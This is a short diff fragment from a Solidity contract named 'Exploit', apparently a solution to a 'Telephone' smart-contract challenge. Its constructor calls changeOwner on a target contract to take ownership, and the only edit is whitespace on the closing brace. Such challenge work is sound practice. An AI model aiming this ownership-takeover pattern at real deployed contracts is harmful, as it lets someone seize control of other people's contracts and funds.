@@ -10,4 +10,4 @@ contract Exploit{
     constructor(address _target){
         ITelephone(_target).changeOwner(msg.sender);
     }
-}
+} 
